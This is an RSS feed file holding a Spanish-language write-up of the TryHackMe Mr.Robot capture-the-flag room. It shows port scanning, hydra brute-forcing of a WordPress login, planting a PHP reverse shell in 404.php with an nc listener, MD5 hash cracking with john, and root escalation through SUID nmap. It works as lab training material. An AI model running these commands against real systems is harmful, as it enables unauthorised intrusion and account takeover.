@@ -1,0 +1,310 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>hash raw-md5 on d3b0o</title>
+        <link>https://d3b0o.github.io/tags/hash-raw-md5/</link>
+        <description>Recent content in hash raw-md5 on d3b0o</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Tue, 20 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/tags/hash-raw-md5/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución CTF Mr.Robot</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/</link>
+        <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/1.jpg" alt="Featured image of post Resolución CTF Mr.Robot" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mrrobot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/mrrobot&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.193.138&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.193.138
+PING 10.10.193.138 (10.10.193.138) 56(84) bytes of data.
+64 bytes from 10.10.193.138: icmp_seq=1 ttl=63 time=56.6 ms
+
+--- 10.10.193.138 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 56.631/56.631/56.631/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.138 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.46.125
+   5   │     [*] Open ports: 80,443
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p80,443 -sV -sC 10.10.193.138 -oN target
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache
+443/tcp open  ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&#39;t have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;Con el whatweb podemos ver mas información sobre la web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.193.138
+http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.193.138], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web vemos una animación que simula el arranque de un Linux, quando termina muestra el siguiente mensaje&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal.png&#34;
+	width=&#34;1834&#34;
+	height=&#34;417&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;439&#34;
+		data-flex-basis=&#34;1055px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Mas abajo vemos una &amp;ldquo;terminal&amp;rdquo; en la cual solo se pueden usar los comandos que salen arriba&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2.png&#34;
+	width=&#34;254&#34;
+	height=&#34;232&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;262px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Todos los comandos muestran videos, fotos y mensajes relacionados con la serie&amp;hellip;&lt;/p&gt;
+&lt;h3 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h3&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta gpbuster para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u http://10.10.46.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+2022/12/19 21:57:53 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 236] [--&amp;gt; http://10.10.193.138/images/]
+/blog                 (Status: 301) [Size: 234] [--&amp;gt; http://10.10.193.138/blog/]
+/rss                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/sitemap              (Status: 200) [Size: 0]
+/login                (Status: 302) [Size: 0] [--&amp;gt; http://10.10.193.138/wp-login.php]
+/0                    (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/0/]
+/feed                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/video                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/video/]
+/image                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/image/]
+/atom                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/atom/]
+/wp-content           (Status: 301) [Size: 240] [--&amp;gt; http://10.10.193.138/wp-content/]
+/admin                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/admin/]
+/audio                (Status: 301) [Size: 235] [--&amp;gt; http://10.10.193.138/audio/]
+/intro                (Status: 200) [Size: 516314]
+/wp-login             (Status: 200) [Size: 2613]
+/css                  (Status: 301) [Size: 233] [--&amp;gt; http://10.10.193.138/css/]
+/rss2                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/]
+/license              (Status: 200) [Size: 309]
+/wp-includes          (Status: 301) [Size: 241] [--&amp;gt; http://10.10.193.138/wp-includes/]
+/js                   (Status: 301) [Size: 232] [--&amp;gt; http://10.10.193.138/js/]
+/Image                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/Image/]
+/rdf                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/feed/rdf/]
+/page1                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.193.138/]
+/readme               (Status: 200) [Size: 64]
+/robots               (Status: 200) [Size: 41]
+/dashboard            (Status: 302) [Size: 0] [--&amp;gt; http://10.10.193.138/wp-admin/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta muchos subdirectorios, despues de ir probando uno por uno, e visto 2 que son importantes&lt;/p&gt;
+&lt;h4 id=&#34;robots&#34;&gt;/robots/&lt;/h4&gt;
+&lt;p&gt;Contenido del &lt;code&gt;/robots/&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;User-agent: *
+fsocity.dic
+key-1-of-3.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la primera key&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ curl http://10.10.193.138/key-1-of-3.txt
+---------- key 1 ----------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En el robots también indica otro archivo &lt;code&gt;fsocity.dic&lt;/code&gt;, con wget nos lo podemos passar a nuestra máquina&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ wget http://10.10.193.138/fsocity.dic
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Es un dicionario con 858160 palabras&lt;/p&gt;
+&lt;h4 id=&#34;wp-admin&#34;&gt;/wp-admin/&lt;/h4&gt;
+&lt;p&gt;En &lt;code&gt;wp-admin&lt;/code&gt; hay un panel de login de WordPress, probamos con las típicas credenciales admin:admin, no funcionan pero hay un pequeño detalle importante&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username.png&#34;
+	width=&#34;444&#34;
+	height=&#34;605&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;73&#34;
+		data-flex-basis=&#34;176px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;En vez de decir que las credenciales són incorrectas, especifica que es lo que esta mal, aprovechando esto podemos usar un diccionario de usuarios hasta que no de ese error y despues con las contraseñas&lt;/p&gt;
+&lt;h2 id=&#34;intrusion&#34;&gt;Intrusion&lt;/h2&gt;
+&lt;p&gt;Con hydra vamos a probar con los usuarios de el dicionario que nos descargamos de &lt;code&gt;/fsocity.dic/&lt;/code&gt; con la contraseña test&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ hydra -L fsocity.dic -p test 10.10.193.138 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:Invalid username&amp;quot; -t 30
+
+[80][http-post-form] host: 10.10.193.138   login: Elliot   password: test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos un usuario (&lt;code&gt;Elliot&lt;/code&gt;), ahora con hydra también vamos a probar contraseñas con el dicionario rockyou.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ hydra -l Elliot -P fsocity.dic 10.10.33.39 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:The password you entered for the username Elliot is incorrect&amp;quot; -t 30
+
+[80][http-post-form] host: 10.10.193.138   login: Elliot   password: ER28-0652
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con estas credenciales ya podemos iniciar session en la web, eso nos lleva al panel de administración de la web&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel.png&#34;
+	width=&#34;1885&#34;
+	height=&#34;863&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;218&#34;
+		data-flex-basis=&#34;524px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora el objetivo seria encontrar algún sitio en el que poder subir archivos, para mandar un php malicioso que nos envié una reverse shell&lt;/p&gt;
+&lt;p&gt;En el apartado de posts podemos subir o escribir archivos pero se quedan en texto plano&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts.png&#34;
+	width=&#34;1230&#34;
+	height=&#34;657&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;449px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;En el media podemos subir archivos.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media.png&#34;
+	width=&#34;503&#34;
+	height=&#34;297&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Pero después de comprobarlo con el burpsuite como en la maquina Vulnversity solo acepta archivos con extensiones de fotos.&lt;/p&gt;
+&lt;p&gt;Dentro del apartado de apariencia, en el editor podemos ver que salen los archivos php de la web, los cuales podemos editar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor.png&#34;
+	width=&#34;251&#34;
+	height=&#34;751&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;33&#34;
+		data-flex-basis=&#34;80px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Por ejemplo vamos a abrir el 404.php y vamos a sustituir lo que había por el código de la reverse shell, es importante cambiar el puerto por el que nos ponemos en escucha y la ip de nuestra maquina&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404.png&#34;
+	width=&#34;824&#34;
+	height=&#34;750&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora al poner un subdirectorio random &lt;code&gt;http://10.10.193.138/okjihogyklasd&lt;/code&gt; ejecuta el 404.php y recibimos la conexión.&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;En el directorio &lt;code&gt;/home/robot&lt;/code&gt; esta la segunda flag, también hay un archivo con un hash raw-md5&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+censored password (?)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora al intentar convertirnos en robot sale este error&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ su robot
+su: must be run from a terminal
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con &lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt; se soluciona el problema&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;daemon@linux:/$ python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+daemon@linux:/$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con &lt;code&gt;find / -perm -4000 -exec ls -ldb {} \; 2&amp;gt;/dev/null&lt;/code&gt;, ay un que no deveria de estar ahi, &lt;code&gt;nmap&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap --interactive
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Eso abre el nmap en modo interactive, como se esta ejecutando como root, si hacemos !sh para spawnear una sh, ya somos root, podemos ver la ultima flag en &lt;code&gt;/root&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
